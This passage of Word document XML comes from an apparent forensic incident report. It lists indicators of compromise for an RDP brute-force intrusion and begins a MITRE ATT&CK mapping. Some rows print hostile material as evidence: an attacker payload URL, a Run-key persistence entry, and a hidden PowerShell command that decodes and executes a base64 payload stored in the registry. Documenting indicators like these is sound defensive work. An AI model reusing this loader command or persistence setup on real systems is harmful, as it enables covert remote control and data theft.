              </w:rPr>
              <w:t>http://194.61.24.102/coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Payload download URL used by the DC (IE11) and DESKTOP-SDN1RPT (Edge)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:24:06.940063</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#156</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_http.jsonl#121</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>registry</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\coreupdate</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Fileless persistence (03:44:03 UTC): %COMSPEC% /b /c start /b /min powershell -nop -w hidden -c iex(base64 from HKLM:Software\q9Z1bssi value JqxNhWJA)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7223</w:t>
              <w:br/>
              <w:t>dissect/runkeys.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>coreupdater</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Auto-start LocalSystem service, ImagePath C:\Windows\System32\coreupdater.exe, created 03:42:42 UTC (7045), stopped in memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_Services.csv#115</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>user</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C137\Administrator (S-1-5-21-2232410529-1445159330-2725690660-500)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Compromised domain administrator account (brute-forced via RDP on DC); used for RDP type 10 logon from 10.42.85.10 at 2020-09-19 03:36:24 (LogonId 0x857E73) and all attacker actions on the host.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
              <w:br/>
              <w:t>volatility/windows.getsids.GetSIDs.jsonl#619</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\mortysmith\Documents\My Social Security Number.zip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Initial Explorer-generated name of the staging archive (03:46:15), renamed to loot.zip at 03:46:18 and deleted at 03:47:09 (MFT 87470-2).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15.269625</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18.069334</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36753</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>url</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>http://194.61.24.102/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Attacker HTTP directory listing (228 bytes, SHA256 6978f8fa2bf5afbe1a074401b923ead519ce89471d83376f5cfda50c12bc2d77) browsed with legacy Edge by C137\Administrator 03:39:29-03:44:52 UTC; hosted coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:26.940438</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#153</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_fileinfo.jsonl#137</w:t>
              <w:br/>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Command line of the HKLM Run "coreupdate" fileless Meterpreter loader (Metasploit registry_persistence), executed 05:08:40 at ricksanchez logon (PowerShell 600, psscan PID 508→3316).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
              <w:br/>
              <w:t>dissect/runkeys.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>registry</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HKLM\Software\q9Z1bssi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Random-named registry key created 03:44:03 by the attacker to store the base64 PowerShell/shellcode payload (value JqxNhWJA) read by the Run key loader.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
              <w:br/>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7223</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\Administrator\Downloads\coreupdater.exe.b1jhvkh.partial</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Edge Save-As temporary file of coreupdater.exe (03:40:00.85, MFT 26213), renamed to coreupdater.exe and moved to System32 at 03:40:42. Edge cache copy: ...\MicrosoftEdge\Cache\ELJ4KX67\coreupdater[1].exe (03:39:57.91).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:57.907806</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.847956</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35860</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35845</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Internal DC CITADEL-DC01 (C137.local), compromised by RDP brute force from 194.61.24.102 and used as the RDP pivot into DESKTOP-SDN1RPT (4624 type 10 source, 03:36:24). Internal pivot host, not an external IOC — scope the DC.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:36:23.515604</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#31238</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>spoolsv.exe PID 2188 – RWX MZ region at 0x1840000 (Meterpreter migration)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory IOC: injected PE in spoolsv.exe (SYSTEM) holding C2 socket 50875→203.78.103.109:443 and lsass handle.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#1</w:t>
              <w:br/>
              <w:t>volatility/windows.netscan.NetScan.jsonl#110</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. MITRE ATT&amp;CK mapping</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="7370"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Technique</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Findings / events</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1003.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013, F-026, F-031, T-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1021.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006, F-018, F-022, F-023, F-024, F-031, T-004, T-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>T1021.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7370"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
